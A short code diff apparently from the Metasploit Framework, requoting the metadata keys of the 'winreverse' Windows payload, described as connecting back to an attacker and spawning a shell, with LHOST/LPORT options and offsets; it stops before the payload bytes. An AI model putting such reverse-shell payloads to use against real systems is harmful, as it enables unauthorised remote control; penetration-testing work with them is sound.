@@ -5,23 +5,23 @@ use Pex::Utils;
 
 my $info =
 {
-    Name         => 'winreverse',
-    Version      => '1.0',
-    Description  => 'Connect back to attacker and spawn a shell',
-    Author       => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
-    Arch         => [ 'x86' ],
-    Priv         => 0,
-    OS           => [ 'win32' ],
-    Multistage   => 0,
-    Type         => 'reverse_shell',
-    Size         => '',
-    UserOpts     =>
+    'Name'         => 'winreverse',
+    'Version'      => '1.0',
+    'Description'  => 'Connect back to attacker and spawn a shell',
+    'Author'       => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
+    'Arch'         => [ 'x86' ],
+    'Priv'         => 0,
+    'OS'           => [ 'win32' ],
+    'Multistage'   => 0,
+    'Type'         => 'reverse_shell',
+    'Size'         => '',
+    'UserOpts'     =>
         {
             'LHOST'         =>  [1, 'ADDR', 'Local address to receive connection'],
             'LPORT'         =>  [1, 'PORT', 'Local port to receive connection'],
         },
     # win32 specific code
-    Win32Payload =>
+    'Win32Payload' =>
     {
         Offsets => { 'LPORT' => [164, 'n'], LHOST => [157, 'L'], 'EXITFUNC' => [37, 'L'] },
         Payload =>
